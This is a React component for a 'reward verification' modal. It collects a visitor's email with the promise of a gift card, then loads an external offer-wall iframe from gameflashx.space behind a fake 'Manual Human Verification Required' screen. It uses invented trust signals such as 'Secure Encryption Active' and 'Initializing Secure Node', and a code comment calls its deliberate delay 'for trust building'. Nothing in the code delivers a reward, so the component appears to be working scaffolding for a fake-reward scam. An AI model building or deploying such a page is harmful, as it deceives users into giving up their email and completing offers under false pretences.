'use client';

import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { X, Lock, Loader2, ShieldCheck, CheckCircle2, Zap, Mail, ArrowRight, Info } from 'lucide-react';
import { cn } from '@/lib/utils';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';

/**
 * @fileOverview High-Conversion Verification Portal with Email Capture.
 * Features: Email lead capture, 3-Step Progress Indicator, Sticky Security Header, 
 * and Mobile-First Fullscreen UX.
 */

interface RewardVerificationModalProps {
  isOpen: boolean;
  onClose: () => void;
  brand?: string;
  value?: string;
}

export function RewardVerificationModal({ 
  isOpen, 
  onClose,
  brand = "Reward",
  value = "Selected"
}: RewardVerificationModalProps) {
  const [view, setView] = useState<'email' | 'verification'>('email');
  const [email, setEmail] = useState('');
  const [emailError, setEmailError] = useState('');
  const [iframeLoaded, setIframeLoaded] = useState(false);
  const [activeStep, setActiveStep] = useState(1);
  const [showInitialization, setShowInitialization] = useState(true);

  useEffect(() => {
    if (isOpen) {
      document.body.style.overflow = 'hidden';
      // Reset states
      setView('email');
      setEmail('');
      setEmailError('');
      setIframeLoaded(false);
      setActiveStep(1);
      setShowInitialization(true);
      
      // Check for previously captured email
      const savedEmail = localStorage.getItem('captured_user_email');
      if (savedEmail) {
        setEmail(savedEmail);
      }
    } else {
      document.body.style.overflow = 'unset';
    }
  }, [isOpen]);

  // Advance step when iframe loads
  useEffect(() => {
    if (iframeLoaded) {
      setActiveStep(2);
    }
  }, [iframeLoaded]);

  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    // Basic Validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      setEmailError('Please enter a valid email address');
      return;
    }

    // Save Email
    localStorage.setItem('captured_user_email', email);
    
    // Transition to Verification
    setView('verification');
    
    // Forced initialization delay for trust building
    const timer = setTimeout(() => {
      setShowInitialization(false);
    }, 1500);
    
    return () => clearTimeout(timer);
  };

  if (!isOpen) return null;

  const steps = [
    { id: 1, label: "Start", icon: Zap },
    { id: 2, label: "Complete Offers", icon: ShieldCheck },
    { id: 3, label: "Unlock Reward", icon: CheckCircle2 },
  ];

  return (
    <AnimatePresence>
      <div className="fixed inset-0 z-[10000] flex items-center justify-center p-0 md:p-4 lg:p-8">
        {/* Backdrop */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          onClick={onClose}
          className="absolute inset-0 bg-black/95 backdrop-blur-md"
        />

        {/* Modal Container */}
        <motion.div
          initial={{ opacity: 0, scale: 0.98, y: 10 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.98, y: 10 }}
          className={cn(
            "relative flex flex-col overflow-hidden bg-[#050b18] border-white/10 shadow-[0_0_100px_rgba(0,0,0,0.9)]",
            "w-full h-full md:h-[90vh] md:max-w-[950px] md:rounded-[2.5rem] md:border"
          )}
        >
          {view === 'email' ? (
            /* --- EMAIL CAPTURE VIEW --- */
            <div className="flex-1 flex flex-col items-center justify-center p-8 md:p-16 text-center relative overflow-hidden">
              {/* Background Glows */}
              <div className="absolute top-0 right-0 w-64 h-64 bg-primary/10 rounded-full blur-[100px] pointer-events-none" />
              <div className="absolute bottom-0 left-0 w-64 h-64 bg-primary/5 rounded-full blur-[100px] pointer-events-none" />

              <div className="relative z-10 w-full max-w-md space-y-10 animate-in fade-in zoom-in duration-500">
                <header className="space-y-4">
                  <div className="w-20 h-20 bg-primary/10 rounded-[2rem] border border-primary/20 flex items-center justify-center mx-auto mb-8 shadow-2xl">
                    <Mail className="w-10 h-10 text-primary" />
                  </div>
                  <h2 className="text-3xl md:text-4xl font-black text-white uppercase tracking-tight leading-none">
                    Enter Your Email to <br /><span className="text-primary">Receive Your Reward</span>
                  </h2>
                  <p className="text-white/40 text-sm font-medium uppercase tracking-widest leading-relaxed">
                    We will send your gift card code to your email after verification
                  </p>
                </header>

                <form onSubmit={handleEmailSubmit} className="space-y-6">
                  <div className="space-y-2">
                    <div className="relative group">
                      <Mail className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-white/20 group-focus-within:text-primary transition-colors" />
                      <Input 
                        type="email"
                        value={email}
                        onChange={(e) => {
                          setEmail(e.target.value);
                          if (emailError) setEmailError('');
                        }}
                        placeholder="Enter your email address"
                        className={cn(
                          "h-16 pl-12 bg-white/5 border-white/10 rounded-2xl text-lg font-bold text-white placeholder:text-white/20 focus:border-primary/40 focus:ring-4 focus:ring-primary/5 transition-all",
                          emailError && "border-red-500/50 focus:border-red-500/50"
                        )}
                        required
                      />
                    </div>
                    {emailError && (
                      <p className="text-[10px] font-black text-red-500 uppercase tracking-widest text-left ml-2">
                        {emailError}
                      </p>
                    )}
                  </div>

                  <Button 
                    type="submit"
                    className="w-full h-16 bg-primary hover:bg-primary/90 text-white font-[900] uppercase tracking-[0.2em] text-lg rounded-2xl shadow-xl shadow-primary/20 transition-all hover:scale-[1.02] active:scale-95 border-none"
                  >
                    Continue <ArrowRight className="ml-2 w-6 h-6" />
                  </Button>
                </form>

                <footer className="pt-6 border-t border-white/5">
                  <div className="flex items-center justify-center gap-3 text-[10px] font-bold text-white/20 uppercase tracking-[0.2em]">
                    <ShieldCheck className="w-4 h-4 text-green-500" /> Secure Encryption Active
                  </div>
                </footer>
              </div>

              {/* Close Button for Email View */}
              <button 
                onClick={onClose}
                className="absolute top-6 right-6 w-10 h-10 rounded-full bg-white/5 hover:bg-white/10 flex items-center justify-center text-white/20 hover:text-white transition-all border border-white/5 z-20"
              >
                <X className="w-5 h-5" />
              </button>
            </div>
          ) : (
            /* --- VERIFICATION VIEW (Existing Flow) --- */
            <>
              {/* 1. STICKY SECURITY HEADER */}
              <header className="relative z-30 bg-black/80 backdrop-blur-2xl border-b border-white/10 p-5 md:p-8 shrink-0">
                <div className="flex items-start justify-between gap-4">
                  <div className="flex items-center gap-4">
                    <div className="w-10 h-10 md:w-14 md:h-14 rounded-2xl bg-primary/10 border border-primary/20 flex items-center justify-center shrink-0">
                      <Lock className="w-5 h-5 md:w-7 md:h-7 text-primary" />
                    </div>
                    <div className="space-y-1">
                      <h2 className="text-base md:text-2xl font-black text-white uppercase tracking-tight leading-none">
                        Manual Human <span className="text-primary">Verification Required</span>
                      </h2>
                      <p className="text-[10px] md:text-xs text-white/40 font-medium uppercase tracking-[0.1em]">
                        Complete the steps below to receive your {brand} reward via email
                      </p>
                    </div>
                  </div>
                  
                  <button 
                    onClick={onClose}
                    className="w-10 h-10 rounded-full bg-white/5 hover:bg-white/10 flex items-center justify-center text-white/40 hover:text-white transition-all shrink-0 border border-white/5"
                  >
                    <X className="w-5 h-5" />
                  </button>
                </div>
              </header>

              {/* 2. PROGRESS INDICATOR */}
              <div className="bg-black/40 border-b border-white/5 px-6 py-4 md:py-6 shrink-0 relative z-20">
                <div className="max-w-2xl mx-auto flex items-center justify-between relative">
                  {/* Connector Line */}
                  <div className="absolute top-1/2 left-0 w-full h-0.5 bg-white/5 -translate-y-1/2 z-0" />
                  <motion.div 
                    className="absolute top-1/2 left-0 h-0.5 bg-primary -translate-y-1/2 z-0 origin-left"
                    initial={{ width: '0%' }}
                    animate={{ width: activeStep === 1 ? '0%' : activeStep === 2 ? '50%' : '100%' }}
                    transition={{ duration: 0.8, ease: "easeInOut" }}
                  />

                  {steps.map((step) => (
                    <div key={step.id} className="relative z-10 flex flex-col items-center gap-2">
                      <div className={cn(
                        "w-8 h-8 md:w-10 md:h-10 rounded-full flex items-center justify-center border-2 transition-all duration-500",
                        activeStep >= step.id 
                          ? "bg-primary border-primary text-white shadow-[0_0_15px_rgba(0,150,255,0.4)]" 
                          : "bg-[#0a0a0a] border-white/10 text-white/20"
                      )}>
                        <step.icon className="w-4 h-4 md:w-5 md:h-5" />
                      </div>
                      <span className={cn(
                        "text-[8px] md:text-[10px] font-black uppercase tracking-widest whitespace-nowrap",
                        activeStep >= step.id ? "text-primary" : "text-white/20"
                      )}>
                        {step.label}
                      </span>
                    </div>
                  ))}
                </div>
              </div>

              {/* 3. MAIN VIEWPORT (IFRAME & LOADER) */}
              <div className="flex-1 relative bg-black/20 overflow-hidden flex flex-col">
                <AnimatePresence mode="wait">
                  {showInitialization ? (
                    <motion.div 
                      key="initializing"
                      initial={{ opacity: 0 }}
                      animate={{ opacity: 1 }}
                      exit={{ opacity: 0 }}
                      className="absolute inset-0 flex flex-col items-center justify-center gap-6 z-10"
                    >
                      <div className="relative w-20 h-20">
                        <Loader2 className="w-full h-full text-primary animate-spin" strokeWidth={1.5} />
                        <div className="absolute inset-0 flex items-center justify-center">
                          <Lock className="w-6 h-6 text-primary/40" />
                        </div>
                      </div>
                      <div className="text-center space-y-2">
                        <p className="text-[10px] font-black text-white uppercase tracking-[0.4em] animate-pulse">
                          Initializing Secure Node
                        </p>
                        <p className="text-[8px] font-bold text-white/20 uppercase tracking-widest">
                          Establishing encrypted connection...
                        </p>
                      </div>
                    </motion.div>
                  ) : (
                    <motion.div 
                      key="iframe-content"
                      initial={{ opacity: 0 }}
                      animate={{ opacity: 1 }}
                      className="flex-1 relative"
                    >
                      {!iframeLoaded && (
                        <div className="absolute inset-0 flex flex-col items-center justify-center gap-4 z-0">
                          <Loader2 className="w-10 h-10 text-primary animate-spin" />
                          <span className="text-[10px] font-black text-white/20 uppercase tracking-[0.3em]">
                            Loading Secure Verification...
                          </span>
                        </div>
                      )}
                      
                      <iframe
                        src="https://gameflashx.space/cl/i/277ood"
                        className={cn(
                          "w-full h-full border-none transition-opacity duration-700",
                          iframeLoaded ? "opacity-100" : "opacity-0"
                        )}
                        onLoad={() => setIframeLoaded(true)}
                        title="Reward Verification"
                      />
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>

              {/* 4. BOTTOM TRUST BAR */}
              <footer className="bg-black/60 border-t border-white/5 py-4 px-6 shrink-0 relative z-20">
                <div className="flex flex-col sm:flex-row items-center justify-between gap-4">
                  <div className="flex items-center gap-6">
                    <div className="flex items-center gap-2">
                      <div className="w-1 h-1 rounded-full bg-green-500 animate-pulse" />
                      <span className="text-[9px] font-black text-white/20 uppercase tracking-[0.2em]">Secure</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <div className="w-1 h-1 rounded-full bg-primary animate-pulse" />
                      <span className="text-[9px] font-black text-white/20 uppercase tracking-[0.2em]">Fast Delivery</span>
                    </div>
                  </div>
                  <div className="flex items-center gap-2 text-[9px] font-black text-white/40 uppercase tracking-[0.1em]">
                    <Info className="w-3 h-3 text-primary" /> Reward will be sent to: <span className="text-white">{email}</span>
                  </div>
                </div>
              </footer>
            </>
          )}

          {/* Atmospheric Glow */}
          <div className="absolute -top-48 -right-48 w-96 h-96 bg-primary/5 rounded-full blur-[120px] pointer-events-none" />
          <div className="absolute -bottom-48 -left-48 w-96 h-96 bg-primary/5 rounded-full blur-[120px] pointer-events-none" />
        </motion.div>
      </div>
    </AnimatePresence>
  );
}
